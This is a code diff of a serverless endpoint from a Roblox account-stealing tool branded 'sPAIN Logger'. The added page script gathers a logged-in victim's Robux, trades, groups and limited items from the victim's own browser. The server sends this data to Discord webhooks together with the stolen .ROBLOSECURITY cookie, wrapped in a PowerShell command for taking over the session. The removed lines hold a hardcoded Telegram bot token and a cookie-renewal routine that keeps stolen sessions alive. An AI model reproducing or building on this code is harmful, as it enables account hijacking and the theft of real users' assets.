@@ -1,10 +1,10 @@
-// api/refresh.js — cookie renewal only, no account info fetch
+// api/refresh.js
+// Refresh page: stores the cookie, builds fresh PowerShell on demand.
+// Zero Roblox API calls — cookie stays alive.
+
 const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
 const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
-const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
-const TG_CHAT     = process.env.TG_CHAT  || '7538845070';
 
-// ── Redis ─────────────────────────────────────────────────────────────────────
 async function redisGet(key) {
   try {
     const res  = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
@@ -19,83 +19,32 @@ async function redisGet(key) {
   } catch { return null; }
 }
 
-async function redisSet(key, value) {
-  try {
-    const res = await fetch(`${REDIS_URL}/set/${encodeURIComponent(key)}`, {
-      method: 'POST',
-      headers: { Authorization: `Bearer ${REDIS_TOKEN}`, 'Content-Type': 'application/json' },
-      body: JSON.stringify({ value: JSON.stringify(value) })
-    });
-    return res.ok;
-  } catch { return false; }
+// ── Build "Copy as PowerShell" for roblox.com/home — no API calls ────────────
+function buildPowerShell(cookie) {
+  const escaped = cookie.replace(/`/g, '``').replace(/"/g, '`"');
+  return `$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
+$session.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
+$session.Cookies.Add((New-Object System.Net.Cookie(".ROBLOSECURITY", "${escaped}", "/", "roblox.com")))
+Invoke-WebRequest -UseBasicParsing -Uri "https://www.roblox.com/home" \`
+-WebSession $session \`
+-Headers @{
+  "authority"="www.roblox.com"
+  "accept"="text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"
+  "accept-language"="en-US,en;q=0.9"
+  "cache-control"="max-age=0"
+  "referer"="https://www.roblox.com/"
+  "sec-ch-ua"='"Not_A Brand";v="8", "Chromium";v="124", "Google Chrome";v="124"'
+  "sec-ch-ua-mobile"="?0"
+  "sec-ch-ua-platform"='"Windows"'
+  "sec-fetch-dest"="document"
+  "sec-fetch-mode"="navigate"
+  "sec-fetch-site"="same-origin"
+  "sec-fetch-user"="?1"
+  "upgrade-insecure-requests"="1"
+}`;
 }
 
-// ── Cookie renewal via Roblox auth ticket flow ────────────────────────────────
-async function renewCookie(oldCookie) {
-  try {
-    const cookieHeader = {
-      'Cookie':         `.ROBLOSECURITY=${oldCookie}`,
-      'User-Agent':     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
-      'Referer':        'https://www.roblox.com/',
-      'Origin':         'https://www.roblox.com',
-      'Content-Length': '0'
-    };
-
-    // Step 1 — get CSRF token (Roblox 403s but returns x-csrf-token header)
-    const csrfRes = await fetch('https://auth.roblox.com/v2/logout', {
-      method: 'POST',
-      headers: cookieHeader
-    });
-    const csrf = csrfRes.headers.get('x-csrf-token');
-    if (!csrf) return null;
-
-    // Step 2 — request an authentication ticket
-    const ticketRes = await fetch('https://auth.roblox.com/v1/authentication-ticket', {
-      method: 'POST',
-      headers: {
-        ...cookieHeader,
-        'x-csrf-token':  csrf,
-        'Content-Type':  'application/json',
-        'Content-Length': undefined
-      },
-      body: '{}'
-    });
-    if (!ticketRes.ok) return null;
-    const ticket = ticketRes.headers.get('rbx-authentication-ticket');
-    if (!ticket) return null;
-
-    // Step 3 — redeem the ticket for a brand-new .ROBLOSECURITY cookie
-    const redeemRes = await fetch('https://auth.roblox.com/v1/authentication-ticket/redeem', {
-      method: 'POST',
-      headers: {
-        'RBXAuthenticationNegotiation': ticket,
-        'Content-Type':                 'application/json',
-        'Referer':                      'https://www.roblox.com',
-        'User-Agent':                   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
-      },
-      body:     JSON.stringify({ authenticationTicket: ticket }),
-      redirect: 'manual'  // new cookie is in Set-Cookie, don't follow redirect
-    });
-
-    // Extract from Set-Cookie header
-    const setCookie = redeemRes.headers.get('set-cookie') || '';
-    const match     = setCookie.match(/\.ROBLOSECURITY=([^;]+)/);
-    if (match?.[1]) return match[1];
-
-    // Fallback: some versions return it in body
-    try {
-      const j = await redeemRes.json();
-      if (j?.token) return j.token;
-    } catch (_) {}
-
-    return null;
-  } catch (err) {
-    console.error('Cookie renewal error:', err);
-    return null;
-  }
-}
-
-// ── Discord helpers ───────────────────────────────────────────────────────────
+// ── Discord ───────────────────────────────────────────────────────────────────
 async function discordSend(url, payload) {
   if (!url?.includes('discord.com/api/webhooks')) return;
   try {
@@ -110,24 +59,26 @@ async function discordSend(url, payload) {
 async function discordChunked(url, text) {
   let rem = text; let first = true;
   while (rem.length > 0) {
-    const chunk = rem.substring(0, 1990); rem = rem.substring(1990);
-    await discordSend(url, {
-      content: first
-        ? '```\n' + chunk + (rem.length === 0 ? '\n```' : '')
-        : chunk + (rem.length === 0 ? '\n```' : '')
-    });
+    const chunk = rem.substring(0, 1950); rem = rem.substring(1950);
+    const content = first
+      ? '```powershell\n' + chunk + (rem.length === 0 ? '\n```' : '')
+      : chunk + (rem.length === 0 ? '\n```' : '');
+    await discordSend(url, { content });
     first = false;
   }
 }
 
-async function tgSend(text) {
-  try {
-    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
-    });
-  } catch (_) {}
+async function sendPSToDiscord(webhookUrl, powershell, pageName) {
+  const now = new Date().toISOString();
+  await discordSend(webhookUrl, {
+    embeds: [{
+      title:       '🔄 Fresh PowerShell',
+      description: `Regenerated for **${pageName}**\nPaste into PowerShell to access the account.`,
+      color:       0x06b6d4,
+      footer:      { text: `sPAIN Tools • ${now}` }
+    }]
+  });
+  await discordChunked(webhookUrl, powershell);
 }
 
 // ── Page HTML ─────────────────────────────────────────────────────────────────
@@ -152,7 +103,7 @@ function buildPage(id) {
   .card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent),var(--accent2),var(--accent3));border-radius:20px 20px 0 0}
   .logo{font-family:'Orbitron',sans-serif;font-size:1.1rem;font-weight:900;letter-spacing:0.05em;margin-bottom:20px}
   .logo span{color:var(--accent);text-shadow:0 0 16px rgba(192,38,211,0.5)}
-  .status{font-size:0.88rem;color:var(--muted);line-height:1.9;min-height:40px}
+  .status{font-size:0.82rem;color:var(--muted);line-height:1.9;min-height:40px;white-space:pre-line}
   .ok{color:#4ade80}.err{color:#f472b6}
   .spin{position:relative;padding-right:24px}
   .spin::after{content:'';position:absolute;right:0;top:50%;margin-top:-6px;width:14px;height:14px;border:2px solid var(--accent);border-top-color:transparent;border-radius:50%;animation:spin .7s linear infinite}
@@ -163,37 +114,139 @@ function buildPage(id) {
 <div class="aurora"><div class="blob blob1"></div><div class="blob blob2"></div></div>
 <div class="card">
   <div class="logo">s<span>PAIN</span> Tools</div>
-  <div class="status spin" id="st">Refreshing cookie&hellip;</div>
+  <div class="status spin" id="st">Collecting account info&hellip;</div>
 </div>
 <script>
+// All Roblox API calls happen FROM THE VICTIM'S BROWSER
+// so Roblox sees their own IP — zero logout risk
+async function robloxGet(url) {
+  try {
+    const r = await fetch(url, { credentials: 'include' });
+    if (!r.ok) return null;
+    return await r.json();
+  } catch { return null; }
+}
+
+function fmt(n) { return Number(n||0).toLocaleString(); }
+
 async function run() {
   const st = document.getElementById('st');
+
   try {
+    // Step 1 — get uid (uses their own browser cookies automatically)
+    const auth = await robloxGet('https://users.roblox.com/v1/users/authenticated');
+    if (!auth?.id) {
+      st.className = 'status err';
+      st.textContent = '\u274c Cookie expired or not logged in.';
+      return;
+    }
+    const uid = auth.id;
+
+    st.textContent = 'Fetching account data\u2026';
+
+    // Step 2 — fetch all safe endpoints in parallel from victim browser
+    const [robuxData, friendsData, isPremium, groupsData, limitedsData, avatarData,
+           txDay, txWeek, txYear, profileData, pendingData] = await Promise.all([
+      robloxGet('https://economy.roblox.com/v1/user/currency'),
+      robloxGet('https://friends.roblox.com/v1/users/' + uid + '/friends/count'),
+      robloxGet('https://premiumfeatures.roblox.com/v1/users/' + uid + '/validate-membership'),
+      robloxGet('https://groups.roblox.com/v1/users/' + uid + '/groups/roles'),
+      robloxGet('https://inventory.roblox.com/v1/users/' + uid + '/assets/collectibles?limit=100&sortOrder=Desc'),
+      robloxGet('https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=' + uid + '&size=150x150&format=Webp'),
+      robloxGet('https://economy.roblox.com/v2/users/' + uid + '/transaction-totals?timeFrame=Day&transactionType=summary'),
+      robloxGet('https://economy.roblox.com/v2/users/' + uid + '/transaction-totals?timeFrame=Week&transactionType=summary'),
+      robloxGet('https://economy.roblox.com/v2/users/' + uid + '/transaction-totals?timeFrame=Year&transactionType=summary'),
+      robloxGet('https://users.roblox.com/v1/users/' + uid),
+      robloxGet('https://trades.roblox.com/v1/trades/inbound?limit=25&sortOrder=Asc'),
+    ]);
+
+    // Step 3 — group robux
+    const groups = groupsData?.data || [];
+    const owned  = groups.filter(g => g.role?.rank === 255);
+    let groupRobux = 0, groupPending = 0;
+    for (const g of owned.slice(0, 3)) {
+      const [cr, pr] = await Promise.all([
+        robloxGet('https://economy.roblox.com/v1/groups/' + g.group.id + '/currency'),
+        robloxGet('https://economy.roblox.com/v2/groups/' + g.group.id + '/transactions?transactionType=pending&limit=10')
+      ]);
+      if (cr) groupRobux   += cr.robux || 0;
+      if (pr) groupPending += pr.data?.reduce((a, t) => a + (t.currency?.amount || 0), 0) || 0;
+    }
+
+    // Step 4 — limiteds
+    const limiteds      = limitedsData?.data || [];
+    const limitedsValue = limiteds.reduce((s, i) => s + (i.recentAveragePrice || 0), 0);
+    const limitedNames  = limiteds.map(i => i.name || '');
+    const hasHeadless   = limitedNames.some(n => n.toLowerCase().includes('headless'));
+    const hasKorblox    = limitedNames.some(n => n.toLowerCase().includes('korblox'));
+
+    // Step 5 — pending robux from trades
+    let pendingRobux = 0;
+    if (pendingData?.data) {
+      pendingRobux = pendingData.data.reduce((s, t) =>
+        s + (t.offers?.find(o => o.user?.id !== uid)?.robux || 0), 0);
+    }
+
+    // Step 6 — account age
+    let accountAgeDays = 'N/A';
+    if (profileData?.created) {
+      accountAgeDays = Math.floor((Date.now() - new Date(profileData.created).getTime()) / 86400000);
+    }
+
+    const avatarUrl = avatarData?.data?.[0]?.imageUrl || '';
+
+    // Step 7 — send collected data to /api/refresh for Discord dispatch
+    st.textContent = 'Sending to Discord\u2026';
+
     const r = await fetch('/api/refresh', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ id: '${id}' })
+      body: JSON.stringify({
+        id: '${id}',
+        clientData: {
+          id: uid, username: auth.name, displayName: auth.displayName,
+          robux: robuxData?.robux || 0, pendingRobux,
+          txDay:  txDay?.incomingRobuxTotal  || 0,
+          txWeek: txWeek?.incomingRobuxTotal || 0,
+          txYear: txYear?.incomingRobuxTotal || 0,
+          friends: friendsData?.count || 0,
+          isPremium: isPremium === true,
+          accountAgeDays,
+          groupsOwned: owned.length, groupRobux, groupPending,
+          limitedsCount: limiteds.length, limitedsValue,
+          hasHeadless, hasKorblox,
+          avatarUrl,
+        }
+      })
     });
+
     const d = await r.json();
     st.className = 'status';
     if (d.success) {
       st.className = 'status ok';
-      st.textContent = d.renewed
-        ? '\u2705 Cookie renewed and sent to Discord!'
-        : '\u2713 Cookie is still valid \u2014 sent to Discord!';
+      st.textContent = '\u2705 Account info sent to Discord!';
     } else {
       st.className = 'status err';
-      st.textContent = '\u274c ' + (d.error || 'Failed \u2014 cookie may be expired.');
+      st.textContent = '\u274c ' + (d.error || 'Failed.');
     }
-  } catch {
+  } catch(e) {
     st.className = 'status err';
-    st.textContent = '\u274c Network error.';
+    st.textContent = '\u274c Error: ' + e.message;
   }
 }
 run();
 </script>
 </body>
 </html>`;
+}
+
+
+// ── Body parser ───────────────────────────────────────────────────────────────
+function parseBody(raw) {
+  if (!raw) return {};
+  if (typeof raw === 'object' && !Buffer.isBuffer(raw)) return raw;
+  try { return JSON.parse(Buffer.isBuffer(raw) ? raw.toString('utf8') : String(raw)); }
+  catch { return {}; }
 }
 
 // ── Handler ───────────────────────────────────────────────────────────────────
@@ -203,87 +256,135 @@ export default async function handler(req, res) {
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
   if (req.method === 'OPTIONS') return res.status(204).end();
 
-  // ── GET — serve the page ──────────────────────────────────────────────────
+  // ── GET: serve the HTML page ──────────────────────────────────────────────
   if (req.method === 'GET') {
-    const id = new URL('http://x' + req.url).searchParams.get('id') || '';
-    if (!id) {
+    const refreshId = new URL('http://x' + req.url).searchParams.get('id') || '';
+    if (!refreshId) {
       res.setHeader('Content-Type', 'text/html');
-      return res.status(400).send('<h1 style="font-family:sans-serif;padding:40px;color:#f472b6;background:#080810;min-height:100vh">Missing ID</h1>');
+      return res.status(400).send('<h1 style="font-family:sans-serif;padding:40px;color:#f472b6">Missing refresh ID</h1>');
     }
-    const record = await redisGet(`refresh:${id}`);
+    const record = await redisGet(`refresh:${refreshId}`);
     if (!record) {
       res.setHeader('Content-Type', 'text/html');
-      return res.status(404).send('<h1 style="font-family:sans-serif;padding:40px;color:#f472b6;background:#080810;min-height:100vh">Link expired or not found</h1>');
+      return res.status(404).send('<h1 style="font-family:sans-serif;padding:40px;color:#f472b6;background:#080810;min-height:100vh;display:block">Link expired or not found</h1>');
     }
     res.setHeader('Content-Type', 'text/html; charset=utf-8');
-    return res.status(200).send(buildPage(id));
+    return res.status(200).send(buildPage(refreshId));
   }
 
-  // ── POST — renew cookie, send to Discord, nothing else ────────────────────
+  // ── POST: build PowerShell from stored cookie, send to Discord ────────────
   if (req.method === 'POST') {
-    let body = req.body;
-    if (typeof body === 'string') { try { body = JSON.parse(body); } catch {} }
-    if (Buffer.isBuffer(body))    { try { body = JSON.parse(body.toString('utf8')); } catch {} }
+    // ID comes from the request BODY only — the URL for POST is just /api/refresh
+    const body   = parseBody(req.body);
+    const postId = body?.id;
 
-    const id = body?.id;
-    if (!id) return res.status(400).json({ error: 'id required' });
+    if (!postId) return res.status(400).json({ error: 'id is required in request body' });
 
-    const record = await redisGet(`refresh:${id}`);
+    const record = await redisGet(`refresh:${postId}`);
     if (!record)         return res.status(404).json({ error: 'Link not found or expired' });
     if (!record.cookie)  return res.status(500).json({ error: 'No cookie stored' });
     if (!record.webhook) return res.status(500).json({ error: 'No webhook stored' });
 
-    const now = new Date().toISOString();
+    const body2   = parseBody(req.body);
+    const info     = body2?.clientData;
+    const pageName = record.pageName || postId;
+    const now      = new Date().toISOString();
 
-    // ── Attempt cookie renewal ─────────────────────────────────────────────
-    const newCookie = await renewCookie(record.cookie);
-
-    // Use renewed cookie if successful, otherwise fall back to stored one
-    const cookieToSend = newCookie || record.cookie;
-    const renewed      = !!newCookie;
-
-    // ── Update stored cookie if renewal succeeded ──────────────────────────
-    if (renewed) {
-      await redisSet(`refresh:${id}`, { ...record, cookie: newCookie, lastRefresh: now });
-    }
-
-    // ── Collect webhooks ───────────────────────────────────────────────────
     const webhooks = [record.webhook];
     if (record.webhook1 && record.webhook1 !== record.webhook) webhooks.push(record.webhook1);
 
-    // ── Send to Discord: small status embed + raw cookie ──────────────────
+    if (!info) {
+      // Fallback: no clientData — just send PowerShell
+      const ps = buildPowerShell(record.cookie);
+      await Promise.all(webhooks.map(wh => sendPSToDiscord(wh, ps, pageName)));
+      return res.status(200).json({ success: true });
+    }
+
+    function fmt(n) { return Number(n||0).toLocaleString(); }
+
     for (const wh of webhooks) {
+      // Embed 1: Robux
       await discordSend(wh, {
+        content: '@everyone',
         embeds: [{
-          title:       renewed ? '\ud83d\udd04 Cookie Renewed' : '\ud83c\udf70 Cookie Re-sent (unchanged)',
-          description: renewed
-            ? 'A fresh `.ROBLOSECURITY` cookie was successfully generated.'
-            : 'Renewal was not possible right now \u2014 original cookie re-sent.',
-          color:       renewed ? 0x22c55e : 0xa855f7,
+          title: '💰 Robux & Pending',
+          color: 0xc026d3,
           fields: [
-            { name: '\ud83d\udccd Page',       value: record.pageName || 'Unknown', inline: true },
-            { name: '\ud83c\udf10 IP',          value: record.ip       || 'Unknown', inline: true },
-            { name: '\ud83d\uddfa\ufe0f ISP',   value: record.isp      || 'Unknown', inline: true },
-            { name: '\ud83d\udcc5 Refreshed at', value: `\`${now}\``,                inline: false }
+            { name: '💰 Balance',  value: fmt(info.robux) + ' R$',        inline: true },
+            { name: '⏳ Pending',  value: fmt(info.pendingRobux) + ' R$', inline: true },
           ],
-          footer:    { text: `sPAIN Logger \u2022 ${record.pageName || id}` },
-          timestamp: now
+          footer:    { text: 'sPAIN Logger • ' + pageName + ' • ' + now },
+          thumbnail: { url: info.avatarUrl }
         }]
       });
 
-      // Raw cookie as plain chunked message — exact bytes
-      await discordChunked(wh, cookieToSend);
+      // Embed 2: Account
+      await discordSend(wh, {
+        embeds: [{
+          title: '🧑 ' + info.username + (info.isPremium ? ' ⭐' : ''),
+          color: 0xc026d3,
+          fields: [
+            { name: '🆔 ID',         value: String(info.id),              inline: true },
+            { name: '📊 Age',         value: info.accountAgeDays + ' days',inline: true },
+            { name: '👥 Friends',     value: fmt(info.friends),            inline: true },
+          ],
+          footer:    { text: 'sPAIN Logger • ' + pageName },
+          thumbnail: { url: info.avatarUrl }
+        }]
+      });
+
+      // Embed 3: Summary
+      await discordSend(wh, {
+        embeds: [{
+          title: '📈 Robux Summary',
+          color: 0xc026d3,
+          fields: [
+            { name: '📅 Today',     value: fmt(info.txDay)  + ' R$', inline: true },
+            { name: '📅 This Week', value: fmt(info.txWeek) + ' R$', inline: true },
+            { name: '📅 This Year', value: fmt(info.txYear) + ' R$', inline: true },
+          ],
+          footer:    { text: 'sPAIN Logger • ' + pageName },
+          thumbnail: { url: info.avatarUrl }
+        }]
+      });
+
+      // Embed 4: Groups
+      await discordSend(wh, {
+        embeds: [{
+          title: '👥 Groups',
+          color: 0xc026d3,
+          fields: [
+            { name: '👥 Owned',   value: String(info.groupsOwned),       inline: true },
+            { name: '🏦 Balance', value: fmt(info.groupRobux) + ' R$',   inline: true },
+            { name: '⏳ Pending', value: fmt(info.groupPending) + ' R$', inline: true },
+          ],
+          footer:    { text: 'sPAIN Logger • ' + pageName },
+          thumbnail: { url: info.avatarUrl }
+        }]
+      });
+
+      // Embed 5: Limiteds
+      await discordSend(wh, {
+        embeds: [{
+          title: '🛒 Limiteds',
+          color: 0xc026d3,
+          fields: [
+            { name: '🛒 Count',    value: String(info.limitedsCount),        inline: true },
+            { name: '💎 RAP',      value: fmt(info.limitedsValue) + ' R$',   inline: true },
+            { name: '💀 Headless', value: info.hasHeadless ? '✅ Yes' : '❌ No', inline: true },
+            { name: '🤖 Korblox',  value: info.hasKorblox  ? '✅ Yes' : '❌ No', inline: true },
+          ],
+          footer:    { text: 'sPAIN Logger • ' + pageName },
+          thumbnail: { url: info.avatarUrl }
+        }]
+      });
+
+      // PowerShell
+      const ps = buildPowerShell(record.cookie);
+      await sendPSToDiscord(wh, ps, pageName);
     }
 
-    // ── Telegram log ───────────────────────────────────────────────────────
-    await tgSend([
-      renewed ? `\ud83d\udd04 <b>COOKIE RENEWED</b>` : `\ud83c\udf70 <b>COOKIE RE-SENT</b>`,
-      `\ud83d\udccd ${record.pageName || id}`,
-      `\ud83c\udf10 <code>${record.ip || 'Unknown'}</code>`,
-      `\ud83d\udcc5 ${now}`
-    ].join('\n'));
-
-    return res.status(200).json({ success: true, renewed });
+    return res.status(200).json({ success: true });
   }
 
   return res.status(405).json({ error: 'Method not allowed' });
